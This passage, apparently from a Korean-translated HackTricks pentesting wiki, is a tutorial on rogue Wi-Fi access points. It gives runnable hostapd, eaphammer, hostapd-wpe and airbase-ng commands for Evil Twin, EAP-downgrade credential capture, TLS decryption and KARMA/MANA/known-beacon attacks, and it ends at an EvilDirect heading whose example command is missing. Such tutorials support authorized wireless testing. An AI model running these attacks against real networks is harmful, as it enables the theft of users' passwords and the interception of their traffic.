```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
구성 파일 `hostapd.conf` 생성:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**방해하는 프로세스 중지**, **monitor mode** 설정 및 **hostapd 시작**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 포워딩 및 리다이렉션
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack는 WiFi clients가 네트워크를 인식하는 방식을 악용하며, 주로 네트워크 이름(ESSID)에 의존하고 base station (access point)이 client에게 스스로를 인증하도록 요구하지 않는다. 주요 사항은 다음과 같다:

- **구분의 어려움**: 장치는 동일한 ESSID와 암호화 유형을 공유할 경우 정상 access point와 악성 access point를 구분하기 어렵다. 실제 네트워크는 원활한 커버리지 확장을 위해 동일한 ESSID를 사용하는 여러 access point를 자주 사용한다.
- **클라이언트 로밍 및 연결 조작**: 802.11 프로토콜은 장치가 동일한 ESS 내에서 access points 간에 로밍할 수 있도록 허용한다. 공격자는 이를 이용해 장치가 현재의 base station 연결을 끊고 rogue access point에 연결하도록 유도할 수 있다. 이는 더 강한 신호를 제공하거나 deauthentication packets 또는 jamming 같은 방법으로 정상 access point와의 연결을 방해함으로써 이루어질 수 있다.
- **실행의 어려움**: 여러 개의 잘 배치된 access points가 있는 환경에서는 evil twin attack을 성공적으로 수행하기가 어려울 수 있다. 단일 정상 access point를 deauthenticate하면, 공격자가 주변의 모든 access points를 deauthenticate하거나 전략적으로 rogue access point를 배치하지 않는 한 장치는 종종 다른 정상 access point에 연결된다.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
또한 **eaphammer**를 사용하여 Evil Twin을 생성할 수도 있습니다 (eaphammer로 evil twins를 생성하려면 인터페이스가 **monitor** 모드에 **있어서는 안 됩니다**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
또는 Airgeddon을 사용: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

기본적으로 PNL에 저장된 ESSID가 WPA로 보호된 상태라면, 기기는 자동으로 Open evil Twin에 연결하지 않습니다. 실제 AP를 DoS하여 사용자가 수동으로 당신의 Open evil Twin에 연결하기를 기대해볼 수 있고, 또는 실제 AP를 DoS한 뒤 WPA Evil Twin을 사용하여 핸드쉐이크를 캡처할 수도 있습니다(이 방법을 사용하면 PSK를 모르기 때문에 피해자가 당신에게 연결하도록 만들 수는 없지만, 핸드쉐이크를 캡처해 크랙을 시도할 수 있습니다).

_일부 OS와 AV는 Open network에 연결하는 것이 위험하다고 사용자에게 경고할 것입니다..._

### WPA/WPA2 Evil Twin

당신은 **Evil Twin using WPA/2**를 생성할 수 있으며, 장치들이 해당 SSID에 WPA/2로 연결하도록 설정되어 있다면 연결을 시도할 것입니다. 어쨌든, **4-way-handshake를 완료하려면** 클라이언트가 사용할 **비밀번호**를 **알고 있어야** 합니다. 만약 **모른다면**, **연결은 완료되지 않습니다**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

이 공격을 이해하려면 먼저 간단한 [WPA Enterprise explanation](#wpa-enterprise-mgt)를 읽어보시길 권합니다.

**hostapd-wpe 사용**

`hostapd-wpe`는 동작을 위해 **구성** 파일이 필요합니다. 이러한 구성 파일 생성을 **자동화**하려면 [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)를 사용할 수 있습니다 (다운로드할 python 파일은 _/etc/hostapd-wpe/_ 안에 있습니다).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
구성 파일에서 ssid, channel, user files, cret/key, dh parameters, wpa version 및 auth 같은 다양한 항목을 선택할 수 있습니다...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Using EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
기본적으로 EAPHammer는 다음 인증 방법들을 사용합니다(주의: GTC가 plaintext passwords를 얻기 위해 가장 먼저 시도되며 그 이후에 더 강력한 auth methods가 사용됩니다):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
이는 긴 연결 시간을 피하기 위한 기본 방법입니다. 그러나 인증 방법을 약한 것에서 강한 것 순으로 서버에 지정할 수도 있습니다:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon 사용**

`Airgeddon`은 이전에 생성된 인증서를 사용해 WPA/WPA2-Enterprise 네트워크에 EAP 인증을 제공할 수 있습니다. 해당 가짜 네트워크는 연결 프로토콜을 EAP-MD5로 다운그레이드하여 **사용자 정보와 비밀번호의 MD5를 캡처**할 수 있습니다. 이후 공격자는 비밀번호 크랙을 시도할 수 있습니다.\
`Airggedon`은 **지속적인 Evil Twin attack (noisy)** 또는 **누군가 연결할 때까지만 Evil Attack을 생성 (smooth)** 하는 옵션을 제공합니다.

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
이렇게 하면 `hostapd-wpe`가 DH 대신 **RSA를 사용해 키를 교환**하게 되어, 나중에 **서버의 개인 키를 알고 있으면** 트래픽을 **복호화**할 수 있습니다.

이제 수정된 구성으로 평소처럼 **hostapd-wpe**를 사용해 **Evil Twin**을 시작하세요. 또한 Evil Twin 공격을 수행하는 **interface**에서 **`wireshark`**를 실행합니다.

지금 또는 나중에(이미 몇몇 인증 시도(authentication intents)를 캡처한 경우) `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`에서 wireshark에 개인 RSA 키를 추가할 수 있습니다.

새 항목을 추가하고 다음 값으로 폼을 채우세요: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

이 방법은 **공격자가 네트워크에 연결하려는 기기들의 모든 probe 요청에 응답하는 악성 access point (AP)를 생성할 수 있게 한다**. 이 기술은 **기기들이 찾고 있는 네트워크를 가장하여 기기들을 공격자의 AP에 연결되도록 속인다**. 기기가 이 악성 AP에 연결 요청을 보내면 연결이 완료되어 기기는 공격자의 네트워크에 잘못 연결된다.

### MANA

그 후, **기기들이 신뢰할 수 없는 네트워크 응답을 무시하기 시작하면서**, 원래의 karma attack의 효과가 줄어들었다. 그러나 Ian de Villiers와 Dominic White가 제안한 새로운 방법인 **MANA attack**이 등장했다. 이 방법은 악성 AP가 브로드캐스트 probe 요청에 응답하면서 기기들이 이전에 보낸 네트워크 이름(SSIDs)으로 Preferred Network Lists (PNL)을 **캡처하는** 것을 포함한다. 이 정교한 공격은 기기들이 알려진 네트워크를 기억하고 우선순위를 매기는 방식을 악용하여 원래의 karma attack에 대한 보호를 우회한다.

MANA attack은 기기들의 지정된(directed) 및 브로드캐스트(broadcast) probe 요청을 모두 모니터링하며 동작한다. 지정된 요청에 대해서는 기기의 MAC 주소와 요청된 네트워크 이름을 기록하여 이 정보를 리스트에 추가한다. 브로드캐스트 요청이 들어오면 AP는 기기 리스트의 네트워크와 일치하는 정보를 응답하여 기기가 악성 AP에 연결되도록 유도한다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

**Loud MANA attack**는 디바이스가 directed probing을 사용하지 않거나 공격자가 해당 디바이스들의 Preferred Network Lists (PNL)을 알지 못할 때 사용하는 고급 전략이다.  
이 공격은 **같은 지역에 있는 디바이스들은 PNLs에서 일부 네트워크 이름을 공유할 가능성이 높다**는 원리에 기반한다.  
선택적으로 응답하는 대신, 이 공격은 관찰된 모든 디바이스들의 결합된 PNLs에서 발견된 모든 네트워크 이름(ESSID)에 대해 probe responses를 브로드캐스트한다.  
이러한 광범위한 접근 방식은 디바이스가 친숙한 네트워크를 인식하고 rogue Access Point (AP)에 연결을 시도할 가능성을 높인다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

When the **Loud MANA attack** may not suffice, the **Known Beacon attack** presents another approach. 이 방법은 wordlist에서 유도된 잠재적 ESSIDs 목록을 순환하면서 모든 네트워크 이름에 반응하는 AP를 시뮬레이션하여 연결 과정을 brute-forces한다. 이렇게 하면 수많은 네트워크가 존재하는 것처럼 시뮬레이션되어, 피해자의 PNL에 있는 ESSID와 일치하기를 기대하며 기기가 해당 가짜 AP에 연결을 시도하도록 유도한다. 공격은 `--loud` 옵션과 결합하여 장치를 더 적극적으로 유인하도록 증폭시킬 수 있다.

Eaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with `--loud` to create a Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

이 **Known Beacon Burst attack**는 **파일에 나열된 각 ESSID에 대해 beacon frames를 빠르게 연속적으로 브로드캐스트하는 것**을 포함합니다. 이는 가짜 네트워크가 밀집한 환경을 만들어 장치들이 rogue AP에 연결될 가능성을 크게 높이며, 특히 MANA attack와 결합되었을 때 더욱 효과적입니다. 이 기법은 속도와 대량을 이용해 장치들의 네트워크 선택 메커니즘을 압도합니다.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**는 전통적인 access point 없이 Wi-Fi를 통해 장치들이 서로 직접 연결할 수 있게 하는 프로토콜입니다. 이 기능은 프린터나 텔레비전 같은 다양한 Internet of Things (IoT) 장치에 통합되어 장치 간 직접 통신을 지원합니다. Wi-Fi Direct의 주목할 만한 특징은 한 장치가 group owner로서 access point 역할을 맡아 연결을 관리한다는 점입니다.

Security for Wi-Fi Direct connections is established through **Wi-Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

이러한 방법들, 특히 PIN entry는 전통적인 Wi-Fi 네트워크에서 WPS가 갖는 취약점과 동일한 취약성에 노출되어 있어 유사한 공격 벡터의 대상이 됩니다.

### EvilDirect Hijacking

**EvilDirect Hijacking**은 Wi-Fi Direct에 특화된 공격입니다. 이는 Evil Twin 공격의 개념을 반영하지만 Wi-Fi Direct 연결을 목표로 합니다. 이 시나리오에서 공격자는 합법적인 group owner를 사칭하여 장치들이 악성 엔티티에 연결하도록 속이는 것을 목표로 합니다. 이 방법은 `airbase-ng`와 같은 도구를 사용해 사칭 대상 장치의 채널, ESSID, MAC address를 지정하여 실행할 수 있습니다:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: 다음을 살펴보세요 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Facebook 로그인 및 captive portals에서의 WPA 모방)

{{#include ../../banners/hacktricks-training.md}}
